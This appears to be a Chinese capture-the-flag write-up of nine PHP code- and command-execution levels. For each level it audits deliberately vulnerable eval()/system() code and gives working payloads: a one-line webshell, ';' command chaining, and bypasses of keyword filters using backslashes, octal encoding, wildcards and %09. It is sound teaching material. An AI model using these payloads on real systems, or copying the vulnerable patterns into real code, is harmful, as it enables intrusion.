# Level 0 -  代码执行&命令执行

### 审计代码

```php
<?php
$code = "include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;";

$bash = "echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag";

eval($code);

echo "<br>";

system($bash);

highlight_file(__FILE__);

?>
```

$code和$bash都是要执行的命令，分别由eval()和system()函数执行

----

# Level 1 - 一句话木马和代码执行

### 审计代码

```php
<?php
eval($_POST['a']);

highlight_file(__FILE__);

?>
```

* 以POST方式接收一个a参数
* 以eval()函数执行

### payload

`a=system('cat /flag');`

拿到flag：NSSCTF{41b1faa2-688b-45ef-bfd8-bbe37693511f}

----

# Level 2 - PHP代码执行函数

### 主体部分

```
isset($_GET['action']) ? start($_GET['action']) : '';
```

一个三元表达式，当action参数有值时会调用`start($_GET['action'])`，否则设为null

接下来跟着函数走

### 函数部分

```
function start($act){

    $random_func = get_fun();
    
    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }

    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}
```

$act变量来决定函数的作用，一是**当$act为'r'时重置当前函数**，二是**当$act为'submit'时进行赋值和执行hello_ctf函数**

假定我们选择submit时

```
function get_fun(){

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    
    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);
    
    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}
```

这个函数会随机生成一个函数并返回详情地址

```
function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}
```

存在eval()函数，可以直接构造命令，与上题基本一致，payload：

```
GET：action=submit
POST：content=system('cat /flag')
```

----

# Level 3 - 命令执行

### 审计代码

```php
<?php

system($_POST['a']);

highlight_file(__FILE__);


?>
```

依旧是命令执行函数，这次为system()

与eval()函数不同的是：system()函数可以直接执行系统命令并返回输出

所以直接构造payload：`a=cat /flag`

----

# Level 4 - SHELL 运算符

### 审计代码

```php
<?php

function hello_server($ip){
    system("ping -c 1 $ip");
}

isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);


?>
```

检测$_GET['ip']的输入，后执行ping -c 1 $ip，很明显的一个命令截断，可以用；分割成多个命令

直接构造payload：`ip=127.0.0.1;cat /flag`

----

# Level 5 - 黑名单式过滤

### 审计代码

```php
<?php 

function hello_shell($cmd){
    if(preg_match("/flag/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

与以上题不同在于，这次的命令中用preg_match()函数过滤了flag这个字符

### 绕过

这里正则表达式`/flag/`并没有过滤 \ 等（可以用转义\来绕过），也没有使用 . 模式（只能匹配一行，使用%0A可以绕过）

构造payload：`?cmd=cat /fl\ag`

----

# Level 6 - 通配符匹配绕过

### 审计代码

```php
<?php 

function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

没有过滤 a 这个字符，可以采用通配符

### 方法一：八进制

我们发现$和数字没被过滤，想到了八进制绕过

知识点：linux中使用`$'xxx'`（xxx为字符的八进制）的形式可以执行任意代码

例题：[XYCTF2024]ezRCE

payload：

```
?cmd=$'\154\163'    //执行ls指令，没看到flag

?cmd=$'\154\163' $'\57'  //执行ls /指令，看到有flag文件

?cmd=$'\143\141\164' $'\57\146\154\141\147'   //cat /flag
```

### 方法二：通配符

`/bin`这个目录。

`bin`为`binary`的简写，主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等

缺陷：只能盲猜flag位置

payload：

```
?cmd=/???/?a? /??a?     //执行/bin/cat /flag指令
```

----

# Level 7 - 空格过滤

### 代码审计

```php
<?php 

function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

### 空格绕过

可以用${IFS},%09等方式绕过

payload：`?cmd=cat%09/fl\ag`

----

# Level 8 - 文件描述和重定向

### 代码

```php
<?php 

function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

任意命令后缀加入`>/dev/null 2>&1`都会阻止回显

### 分割代码

用" ； "这个符号可以将自己的命令和后面的分割开来

payload：`?cmd=cat /flag;`
